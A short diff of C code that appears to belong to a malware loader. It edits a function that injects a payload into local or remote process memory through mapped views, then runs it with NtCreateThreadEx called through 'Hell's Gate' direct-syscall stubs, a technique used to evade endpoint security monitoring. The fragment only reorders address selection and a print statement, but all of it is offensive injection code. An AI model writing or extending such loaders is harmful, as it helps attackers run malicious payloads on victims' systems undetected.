@@ -125,14 +125,15 @@ BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN
 	}
 
 	// Executing the payload via thread creation
-	pExecAddress = pAllocatedRemoteAddress;
-	if (bIsLocalInjection) {
-		pExecAddress = pAllocatedAddress;
+	pExecAddress = pAllocatedAddress;
+	if (!bIsLocalInjection) {
+		pExecAddress = pAllocatedRemoteAddress;
 	}
+
 	printf("[#] Press <Enter> To Run The Payload ... ");
 	getchar();
-	printf("\t[i] Running Thread Of Entry 0x%p ... ", pExecAddress);
 
+	printf("\t[i] Running Thread Of Entry 0x%p ... ", pExecAddress);
 	HellsGate(g_SyscallsTable.NtCreateThreadEx.wSystemCall);
 	if ((HellDescent(
 		&hThread,
